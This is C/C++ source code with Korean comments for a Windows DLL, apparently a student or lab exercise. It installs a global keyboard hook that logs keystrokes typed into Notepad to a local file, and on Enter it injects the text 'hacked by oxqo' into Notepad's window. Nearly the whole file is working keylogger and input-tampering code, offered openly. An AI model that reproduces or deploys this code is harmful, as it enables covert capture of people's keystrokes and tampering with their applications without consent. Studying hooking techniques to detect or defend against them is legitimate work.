﻿// KeyHook.dll 
#define _CRT_SECURE_NO_WARNINGS
#include "stdio.h" 
#include "windows.h" 

#define DEF_PROCESS_NAME "notepad.exe"


HINSTANCE g_hInstance = NULL;
HHOOK g_hHook = NULL;
HWND g_hWnd = NULL; 
FILE *f1;
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpvReserved)
{
	switch (dwReason)
	{
	case DLL_PROCESS_ATTACH:
		g_hInstance = hinstDLL;
		break;

	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}
extern "C" {
	LRESULT __declspec(dllexport) CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
	{
		char szPath[MAX_PATH] = {0,};
		char *p = NULL;
		char ch;

		HWND pWnd, pEdit=nullptr;
		if (nCode >= 0)
		{
			// bit 31 : 0 => key press, 1 => key release 
			if (!(lParam & 0x80000000))
			{
				GetModuleFileName(NULL, szPath, MAX_PATH);
				p = strrchr(szPath, '\\');
			
				if (!_stricmp(p + 1, DEF_PROCESS_NAME)) {
					ch = (char)wParam; //wParam을 char로 강제형변환.. 대소문자 구분이 안되고 일부 깨짐 
					f1 = fopen("C:\\Users\\32152241\\Desktop\\dll무결성\\keylog", "a"); //키보드 로그를 저장할 경로 
					fputc(ch, f1);
					fclose(f1);
					if (wParam == VK_RETURN) { //엔터가 입력된 경우 메모장의 윈도우를 얻어와 "hacked by oxqo "를 출력한다. 
						pWnd = FindWindow("notepad", NULL); //메모장의 윈도우 얻어오기
						if (pWnd == NULL) {
							printf("null!");
						}
						else

							pEdit = GetWindow(pWnd, GW_CHILD); //메모장의 하위 윈도우 
						if (pEdit != NULL) { //메모장에 출력하는 부분... 
							SendMessage(pEdit, WM_CHAR, 'h', 0);
							SendMessage(pEdit, WM_CHAR, 'a', 0);
							SendMessage(pEdit, WM_CHAR, 'c', 0);
							SendMessage(pEdit, WM_CHAR, 'k', 0);
							SendMessage(pEdit, WM_CHAR, 'e', 0);
							SendMessage(pEdit, WM_CHAR, 'd', 0);
							SendMessage(pEdit, WM_CHAR, ' ', 0);
							SendMessage(pEdit, WM_CHAR, 'b', 0);
							SendMessage(pEdit, WM_CHAR, 'y', 0);
							SendMessage(pEdit, WM_CHAR, ' ', 0);
							SendMessage(pEdit, WM_CHAR, 'o', 0);
							SendMessage(pEdit, WM_CHAR, 'x', 0);
							SendMessage(pEdit, WM_CHAR, 'q', 0);
							SendMessage(pEdit, WM_CHAR, 'o', 0);
							SendMessage(pEdit, WM_CHAR, ' ', 0);


							return 0;
						}
						return 0; //0을 리턴하면 메시지는 정상 전달됨 
					}
				}
			}
		}
		// 일반적인 경우에는 CallNextHookEx() 를 호출하여 
		// 응용프로그램 (혹은 다음 훅) 으로 메시지를 전달함 
		return CallNextHookEx(g_hHook, nCode, wParam, lParam);
	}
}

#ifdef __cplusplus 
extern "C" {
#endif 
	__declspec(dllexport) void HookStart()
	{
		g_hHook = SetWindowsHookEx(WH_KEYBOARD, KeyboardProc, g_hInstance, 0); //후킹 시작 
		printf("Hook Start\n");
	}
	__declspec(dllexport) void HookStop()
	{
		if (g_hHook)
		{
			UnhookWindowsHookEx(g_hHook); //후킹 종료 
			g_hHook = NULL;
		}
	}
#ifdef __cplusplus 
}
#endif

